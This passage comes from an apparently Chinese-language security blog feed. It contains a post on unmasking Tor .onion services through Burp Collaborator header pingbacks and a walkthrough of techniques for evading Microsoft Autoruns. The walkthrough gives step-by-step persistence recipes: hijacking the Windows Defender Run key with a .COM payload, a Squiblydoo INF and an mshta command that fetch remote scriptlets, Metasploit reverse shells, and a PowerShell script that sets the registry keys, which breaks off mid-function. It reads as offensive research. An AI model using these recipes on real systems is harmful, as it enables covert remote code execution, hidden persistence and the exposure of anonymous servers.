+&lt;p&gt;您覺得我們應該從哪裡開始亂塞我們新的Payload？如果你興奮地說“無所不在!!!!”，那麼我喜歡您的風格，並完全同意這個意見！你知道嗎？一位名叫James Kettle的大神也同意了這個觀點，並在今年早些時候寫了一個叫做 &lt;a href=&quot;https://github.com/PortSwigger/collaborator-everywhere&quot;&gt;“Collaborator Everywhere”&lt;/a&gt; 的Burp Suite Professional插件。作者還寫了一篇名為&lt;a href=&quot;http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html&quot;&gt;“Cracking the Lens: Targeting HTTP’s Hidden Attack-Surface”&lt;/a&gt;的精彩Blog貼文，他在這篇文章裡向全世界介紹了他的插件。我的朋友Kat在Blackhat舉辦期間發給我這個連結，而我當時就坐在拉斯維加斯的一個戶外酒吧裡像個怪人一樣用我的手機把它從頭讀到尾，它好到我媽問我為何跪在電腦前，沒在唬的。&lt;/p&gt;
+
+&lt;p&gt;Collaborator Everywhere希望通過Burp Suite自動將這些Collaborator payloads注入到我們所進行的網路瀏覽中來幫助我們識別後端系統和進程。而它究竟做了什麼？看看我剛剛瀏覽我的Blog時它自動插入的一些Header。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/SxIX7Wz.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;它會訪問一個特定的網站，所以我會從我的一個payload injection獲得了相應的DNS查詢：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/mzTBKHO.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;James還釋出了一個&lt;a href=&quot;https://www.youtube.com/watch?v=zP4b3pw94s0&quot;&gt;黑帽演講(你可以在這裡看到)&lt;/a&gt;，他談論了所有他使用這些技術所完成的偉業。在觀看演講的過程中，我認為這種技術可能可被用來識別TOR .onion所隱藏的服務真實IP地址。&lt;/p&gt;
+
+&lt;p&gt;我啟動了我的TOR瀏覽器，並為其配置Burp Suite連接。然後我瀏覽多個.onion隱藏服務，看看他們中的任何一個會給我一個Collaborator的pingback。最後，在我瀏覽到第二十個網站時，它成功了 :P&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/0TwVi8y.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我現在有一個與.onion隱藏服務相關聯的伺服器的真正IP地址，因為它查找了它被提交的含餌Header。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ahfdcGO.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我鼓勵您在您擁有或合法擁有測試權限的網站上使用這些技術。他們易於使用、有趣且非常有效。&lt;/p&gt;
+
+&lt;p&gt;11/24/2017更新：&lt;/p&gt;
+
+&lt;p&gt;我發布的這條推文頗受歡迎，並引發了包括&lt;a href=&quot;https://twitter.com/cchuatl&quot;&gt;@cchuatl&lt;/a&gt;，&lt;a href=&quot;https://twitter.com/albinowax&quot;&gt;@albinowax&lt;/a&gt;和&lt;a href=&quot;https://twitter.com/einaros&quot;&gt;@einaros&lt;/a&gt;在內的好幾個人私訊我有趣的後續意見。該流程的關鍵之一即是該pingback來自很可能非常靠近主機伺服器DNS解析伺服器，但並不一定如此。而這個想法始終存在我的腦海中，這也就是為什麼我使用“關聯”而不是“擁有”的說法，但這方法絕對能夠增加隱藏地址的清晰度。&lt;/p&gt;
+
+&lt;p&gt;更多像我此次提出的反饋正是使資安社群成為更為美好聚集地的一部分。我的目標是不公開任何人的.onion服務，這就是為什麼我清理了所有的屏幕截圖，但在上述截圖情況應非實際位址，但根據網站的內容以及解析器分析的IP地址與我預計的託管位置其實是內聯的，所以我相信它非常接近主機伺服器了。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="forensics" /><summary type="html">發佈於2017年11月23日</summary></entry><entry><title type="html">繞過微軟的AutoRuns</title><link href="https://security-onigiri.github.io//2018/01/29/autoruns.html" rel="alternate" type="text/html" title="繞過微軟的AutoRuns" /><published>2018-01-29T00:00:00-08:00</published><updated>2018-01-29T00:00:00-08:00</updated><id>https://security-onigiri.github.io//2018/01/29/autoruns</id><content type="html" xml:base="https://security-onigiri.github.io//2018/01/29/autoruns.html">&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;by lopi&lt;/td&gt;
+      &lt;td&gt;2017年10月25日發布&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;strong&gt;事件背景&lt;/strong&gt;
+在DerbyCon 7.0上，Chris Bisnett和Kyle Hanslovan聯合發表了一個名為 “Evading Autoruns” 的演講。Kyle和Chris展示了 “繞過” 微軟Sysinternals “Autoruns” 工具的能力。他們主要利用 “PATHEXT” Windows環境變量以及本機上有Microsoft簽章的可執行文件來執行運行註冊表項獲得持久性。在此強烈建議讀者觀看他們的演講，這些傢伙的腦洞真不知道怎麼開的(讚嘆語氣)。以下是Kyle和Chris發表的所有內容。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=AEmuhCwFL5I&amp;amp;feature=youtu.be&quot;&gt;Talk&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/huntresslabs/evading-autoruns/raw/master/Evading_Autoruns_Slides.pdf&quot;&gt;Slides&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/huntresslabs/evading-autoruns/blob/master/pocs.bat&quot;&gt;PoC&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf&quot;&gt;Example “shady” INF&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/huntresslabs/evading-autoruns&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;繞過autoruns的摘要&quot;&gt;&lt;strong&gt;“繞過Autoruns”的摘要&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;當涉及到入侵攻擊時，最關鍵的即是對端點的訪問權限的維護。對於防禦者來說，在網路中發掘這些基點同樣重要。在此次的演講中，Kyle和Chris將揭露幾種用來迴避最常見持久性枚舉工具的半公開以及私有技術。他們的技術將探取重新創建運行密鑰的方法、非常規地濫用搜索序列並利用具可信度的應用程式。為了補充並解釋他們的技術，每個yoyodiy(繞過)都將包括現場演示以及檢測建議。&lt;/p&gt;
+
+&lt;h1 id=&quot;冒險啟程&quot;&gt;&lt;strong&gt;冒險啟程&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;現在我們已經重新審視了所有的演講釋出素材，其中包括觀看演講影片，現在讓我們來深入探討這個演講中有趣的技術內容。我們的目標是獲得Kyle和Chris演講中詳細描述的四種技巧。我們將要實作出來以試圖充分理解此研究並將其應用到實務中。&lt;/p&gt;
+
+&lt;h1 id=&quot;擴展搜索順序自動運行技術&quot;&gt;&lt;strong&gt;擴展搜索順序自動運行技術&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;在第68頁投影片上，我們看到一個有趣的陳述內容。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/uto8fQl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我所在意的部分即是上面被我用紅框標示的部分。這隻字片語立刻讓我想起了Windows上的“PATHEXT”環境變量。我繼續閱讀下面幾頁的投影片，以確保我了解搜索序列的工作原理，然後看到下面這頁的投影片。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6q6zBxM.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;如果我解讀正確無誤的話，PATHEXT環境變量會在搜尋’.EXE’之前先尋找’.COM’擴展名(副檔名)。而下一張投影片正好為我們驗證了這一點。這項研究讓我想起了Derbycon 3.0中Christopher Campbell and Matt Graeber的“&lt;a href=&quot;https://www.youtube.com/watch?v=j-r6UonEkUw&quot;&gt;Living Off the Land&lt;/a&gt;”的演講。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/cTCHRTG.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;好了~我們現在知道搜索順序是如何工作的。理論是，如果我們修改一個現有的註冊表項，我們應該能夠載入一個’.COM’而不是’.EXE’，因為搜索序列會先查找’.COM’擴展名。它正是利用Windows的工作原理，在我上面簡要提到的 “&lt;a href=&quot;https://www.youtube.com/watch?v=j-r6UonEkUw&quot;&gt;Living Off the Land&lt;/a&gt;” 亦有闡述相關理念。接著讓我們繼續檢視他們的投影片。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/dAyJe0C.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;看起來這是在Windows 10上的Windows Defender的註冊表項。我想我們必須修改此註冊表項的值從 “C:\Program Files\Windows Defender\MSASCuiL.exe” 到 “C:\Program Files\Windows Defender\MSASCuiL” 並將’.COM’文件放在同一個目錄中。讓我們來驗證我們是否完全理解他們正在解釋什麼以繼續驗證這投影片的內容。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/MqTabH8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;不賴嘛~我們似乎完全理解正確。現在讓我們確保他們有將’.COM’文件添加到同一個目錄中。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/nkI6ca2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;哼哼~我根本先知。他們的所作所為皆如我所料。但我想知道這在AutoRuns程式中是什麼樣子呢？&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/hiaiTWq.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;天啊！這autoruns繞過思路真是太猥瑣了，這樣我都不知道要怎麼教我小孩子了&amp;gt;&amp;lt;
+你看看他們新添加的’.COM’文件發布者正是 “Microsoft Corporation” 欸？也太糟糕了吧。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/YmRxyYl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;現在我們了解了“擴展名搜索序列”是如何運作的，接著讓我們在Windows 7和Windows 10上來嘗試一下。首先，我將使用我開發的一個名為“&lt;a href=&quot;https://github.com/GreatSCT/GreatSCT&quot;&gt;GreatSCT”(Great Scott&lt;/a&gt;)的工具來生成一個COM腳本Payload。使用我的工具生成COM腳本的要求是環境擁有&lt;a href=&quot;https://www.python.org/downloads/&quot;&gt;Python3&lt;/a&gt;和&lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit&lt;/a&gt;。有了我們生成的Payload，我們需要再目標系統上安裝Microsoft Excel來讓它能正常運作。如果你想更快速的流程，你可以&lt;a href=&quot;https://gist.github.com/subTee/802f6a9ebce79b27b8671fbab86da702&quot;&gt;在這&lt;/a&gt;取得資源以嘗試一下Casey Smith（&lt;a href=&quot;https://twitter.com/subTee&quot;&gt;@subtee&lt;/a&gt;）的以calc.exe證明這個極簡主義COM scriptlet的概念。&lt;/p&gt;
+
+&lt;p&gt;git clone https://github.com/GreatSCT/GreatSCT
+python3 gr8sct.py&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/UCsR35D.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;你會看到下面的提示。按任意鍵開始。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/YTUDUoY.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我們將使用“SCT/regsvr32.cfg”的選項。輸入相關的號碼，然後按Enter。您可以通過使用Tab來完成並鍵入“set ListenerPort 80”作為示例來設置選項。以下是我如何為我們的“擴展名搜索序列”測試範例配置Payload。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/u9EyWdr.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;請注意我如何將輸出位置設置為“MSASCuiL.com”。接著輸入generate並按enter。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jbAnb0q.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;現在我們已經生成了一個COM Payload，我們可以用以測試出“擴展名搜索序列”的技術。讓我們啟動安裝了Excel的Windows 7虛擬機。第一步，讓我們先修改Windows Defender註冊表項。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;HKLM \ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Run \ SecurityHealth（REG_EXPAND_SZ） - C：\ Program Files \ Windows Defender \ MSASCui&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ZEedJ0b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;將你生成的COM Payload命名為“MSASCui.com”放在C:\Program Files\Windows Defender\&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/8fRrTLC.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;讓我們啟動我們的Metasploit監聽器。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/f69aL3p.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;重新啟動我們的Windows 7虛擬機並等待其返還shell。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Fn5ABaQ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It Work！有關Windows 10的詳細內容，請參閱下面的部分教程。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/bhlS6tk.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;squiblydoo-inf自動運行技術&quot;&gt;&lt;strong&gt;Squiblydoo INF自動運行技術&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;首先，讓我們回顧Casey Smith（&lt;a href=&quot;https://twitter.com/subTee&quot;&gt;@subtee&lt;/a&gt;）的“regsvr32.exe” a.k.a. “Squilydoo”。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6DKONHN.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;這是防禦者的反應&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/MiI5cAj.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Chris和Kyle在MSDN文件上發現了以下有關“INF”的內容。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/QWE9vMQ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我很好奇。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/RA6sx9W.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我不知道我們是否可以將其使用在“regsvr32.exe”或“rundll32.exe”上。讓我們繼續看他們的投影片，看看是否有一個“INF”文件的範例。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/fyB9gAk.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;好，很棒。但是這是如何運作的呢？語法看起來似曾相識，也許他們將使用“rundll32.exe”而不是“regsvr32.exe”。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/33cFHwU.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;沒有錯啦~
+我們可以藉由“INF”文件來使用“rundll32.exe”。讓我們確認我們在嘗試之前已獲取所有我們需要的訊息資源。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jJmmpQ6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;所以我們可以使用“rundll32.exe”和“INF”文件來代替“regsvr32.exe”。這相當乾淨俐落，但不幸的是，它不是安全運作方式，你可以在前面他們的談話投影片中看到。這並不完全是我所希望的結果，但這值得探討。我將使用我在之前文章中使用GreatSCT生成的COM scriptlet Payload。您也可以在&lt;a href=&quot;https://gist.github.com/subTee/802f6a9ebce79b27b8671fbab86da702&quot;&gt;這裡&lt;/a&gt;使用Casey Smith（&lt;a href=&quot;https://twitter.com/subTee&quot;&gt;@subtee&lt;/a&gt;）的以calc.exe證明這個極簡主義COM scriptlet的概念。現在讓我們修改它所提供的“shady.inf”。&lt;/p&gt;
+
+&lt;p&gt;; ———————————————————————-
+; Required Sections
+; ———————————————————————-
+[Version]
+Signature=$ CHICAGO $
+Provider=test
+Class=Printer&lt;/p&gt;
+
+&lt;p&gt;[Manufacturer]
+HuntressLabs=ModelsSection,NTx86,NTia64,NTamd64&lt;/p&gt;
+
+&lt;p&gt;; ———————————————————————-
+; Models Section
+; ———————————————————————-
+[ModelsSection.NTx86]
+UnregisterDlls = Squiblydoo&lt;/p&gt;
+
+&lt;p&gt;[ModelsSection.NTia64]
+UnregisterDlls = Squiblydoo&lt;/p&gt;
+
+&lt;p&gt;[ModelsSection.NTamd64]
+UnregisterDlls = Squiblydoo&lt;/p&gt;
+
+&lt;p&gt;; ———————————————————————-
+; Support Sections
+; ———————————————————————-
+[DefaultInstall]
+UnregisterDlls = Squiblydoo&lt;/p&gt;
+
+&lt;p&gt;[Squiblydoo]
+11,,scrobj.dll,2,60,https://blog.conscioushacker.io/testaroo.sct&lt;/p&gt;
+
+&lt;p&gt;我將把它放在我的桌面上，並稱之為“testaroo.inf”。我還在我的Blog上託管了COM scriptlet payload。下一步是創建一個註冊表項。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/HenWxrG.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我的metasploit監聽器仍在運行，所以我們要做的只是重啟Windows 7虛擬機並等待它返還我們要的shell。不幸的是，我沒有得到任何shell，所以我打開Process Hacker來看看發生了什麼事。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/1INwldO.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我們的流程樹中的“rundll32.exe”在哪裡？我怎麼都找不到欸？為了簡化本節論述，我嘗試在Windows 7和Windows 10上使用HKLM和HKCU。但我仍無法使用autoruns註冊表項工作，但是，在Windows 7上手動執行“rundll32.exe setupapi,InstallHinfSection ModelsSection 128 C:\Users\lopi\Desktop\testaroo.inf”時，它倒是正常運作了。我嘗試使用前面提到的calc.exe概念證明。 Chris和Kyle在談話中並沒有提到Windows 10要求驅動程序擁有合法簽名，以便在沒有用戶提示的情況下進行安裝。在這一點上，我決定停深入探討這個。&lt;/p&gt;
+
+&lt;h1 id=&quot;infdefaultinstallexe自動運行技術&quot;&gt;&lt;strong&gt;InfDefaultInstall.exe自動運行技術&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;進入下一個技術，“InfDefaultInstall.exe”。讓我們馬上開始吧？&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/2dTJ9w8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;好的，我們可以使用“InfDefaulInstall.exe”而不是“rundll32.exe”，並用與以前一樣的方法使用它。讓我們啟動我們的Windows 10虛擬機，看看我們是否有相同的數位簽章以及UAC提示“InfDefaultInstall.exe”。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Vy5bGFs.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;有UAC提示欸。那數字簽名呢？&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/NAnpHet.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;悲劇，這對於Windows 10來說並不可行。我建議你在Windows 7或更舊版本上使用這種技術，如果你想實踐它的話。我無法在Windows 7和Windows 10上通過autoruns註冊表項運作。這在演講中聽起來很套路很經典，但我猜這在實踐中是兩碼子事。&lt;/p&gt;
+
+&lt;h1 id=&quot;syncappvpublishingexe自動運行技術&quot;&gt;&lt;strong&gt;SyncAppvPublishing.exe自動運行技術&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;讓我們接著進入這一個主題。它用一張投影片說明了一切。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/dLufm6K.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;看起來很簡單，讓我們嘗試透過添加一個註冊表項到我們的Windows 10虛擬機。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/15Pd1z4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;為了calc，現在我們需要重新啟動Windows 10虛擬機。為了武裝這個，我們可以把它改成各種內建的工具。例如，regsvr32.exe或mshta.exe。有很多選項可以使其自立更生(live off the land)。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/B2vkbS8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;好耶，這個技術可以成功運作耶！&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://blog.conscioushacker.io/wp-content/uploads/2017/10/celery.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;教程&quot;&gt;&lt;strong&gt;教程&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;擴展搜索順序自動運行技術&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Windows 7&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Generate a COM scriptlet payload&lt;/li&gt;
+  &lt;li&gt;Modify existing registry key to load your COM scriptlet instead of the executable.
+    &lt;ul&gt;
+      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealth (REG_EXPAND_SZ) – C:\Program Files\Windows Defender\MSASCui&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Place your COM payload in C:\Program Files\Windows Defender\ as “MSASCui.com”&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;Windows 10&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Generate a COM scriptlet payload&lt;/li&gt;
+  &lt;li&gt;Modify existing registry key to load your COM scriptlet instead of the executable.
+    &lt;ul&gt;
+      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealth (REG_EXPAND_SZ) – C:\Program Files\Windows Defender\MSASCuiL&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Place your COM payload in C:\Program Files\Windows Defender\ as “MSASCuiL.com”&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;Squiblydoo INF自動運行技術&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Windows 7&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Generate a COM scriptlet payload&lt;/li&gt;
+  &lt;li&gt;Modify the “INF” file: https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf&lt;/li&gt;
+  &lt;li&gt;Add registry key to load your INF file.
+    &lt;ul&gt;
+      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealth (REG_EXPAND_SZ) – “rundll32.exe setupapi,InstallHinfSection ModelsSection 128 shady.inf”&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Place your INF payload in C:\Windows\system32.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;Windows 10 (Not recommended due to digital signature warning and UAC)&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Generate a COM scriptlet payload&lt;/li&gt;
+  &lt;li&gt;Modify the “INF” file: https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf&lt;/li&gt;
+  &lt;li&gt;Add registry key to load your INF file.
+    &lt;ul&gt;
+      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WhateverYouWant(REG_EXPAND_SZ) – “rundll32.exe setupapi,InstallHinfSection ModelsSection 128 shady.inf”&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Place your INF payload in C:\Windows\system32.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;InfDefaultInstall.exe自動運行技術 (Does not work)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Windows 7&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Generate a COM scriptlet payload&lt;/li&gt;
+  &lt;li&gt;Modify the “INF” file: https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf&lt;/li&gt;
+  &lt;li&gt;Add registry key to load your INF file.
+    &lt;ul&gt;
+      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WhateverYouWant(REG_EXPAND_SZ) – “InfDefaultInstall.exe shady.inf”&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Place your INF payload in C:\Windows\system32.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;Windows 10 (Not recommended due to digital signature warning and UAC&lt;/strong&gt;)&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Generate a COM scriptlet payload&lt;/li&gt;
+  &lt;li&gt;Modify the “INF” file: https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf&lt;/li&gt;
+  &lt;li&gt;Add registry key to load your INF file.
+    &lt;ul&gt;
+      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WhateverYouWant(REG_EXPAND_SZ) – “InfDefaultInstall.exe shady.inf”&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Place your INF payload in C:\Windows\system32.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;SyncAppvPublishing.exe自動運行技術&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Windows 10&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Generate a “living off the land” payload
+    &lt;ul&gt;
+      &lt;li&gt;i.e. mshta.exe https://blog.conscioushacker.io/testaroo.hta&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Add registry key to execute your payload.
+    &lt;ul&gt;
+      &lt;li&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WhateverYouWant(REG_EXPAND_SZ) – ‘SyncAppvPublishingServer.exe “.; Start-Process mshta.exe https://blog.conscioushacker.io/testaroo.hta”‘&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;autoruns-powershell-script&quot;&gt;&lt;strong&gt;AutoRuns Powershell Script&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;這個&lt;a href=&quot;https://gist.github.com/ConsciousHacker/aa8d4eb96005b8ab954b1287787a9be4&quot;&gt;腳本&lt;/a&gt;應該可以寫得更動態，不過反正能運行嘛，將就用唄。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;#
+    AutoRuns v1.0
+    License: GPLv3
+    Author: @ConsciousHacker
+    Credits: @HuntressLabs
+    References: https://github.com/huntresslabs/evading-autoruns
+#&amp;gt;
+
+function InstallAutoRuns-COM
+{
+	#Place your com scriptlet in C:\Program Files\Windows Defender\ as &quot;MSASCuiL.com&quot;
+	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
+	$FakeProgramName = &quot;SecurityHealth&quot;
+	$ComScriptlet = '&quot;C:\Program Files\Windows Defender\MSASCui&quot;'
+
+	Set-ItemProperty -Path $Autoruns -Name $FakeProgramName -Value $ComScriptlet -Type ExpandString
+
+
+}
+
+function UninstallAutoRuns-COM
+{
+	$AutoRuns = &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
+	$FakeProgramName = &quot;SecurityHealth&quot;
+	$ComScriptlet = '&quot;C:\Program Files\Windows Defender\MSASCui.exe&quot;'
+
+	Set-ItemProperty -Path $Autoruns -Name $FakeProgramName -Value $ComScriptlet -Type ExpandString
+}
+
+function InstallAutoRuns-INFDefaultInstall
+{
+	param
+		(
+			[Parameter(Mandatory = $True)]
+			[string]$Path
+		)
+	# Example inf here: https://github.com/huntresslabs/evading-autoruns/blob/master/shady.inf
+	# TODO: Generate inf file
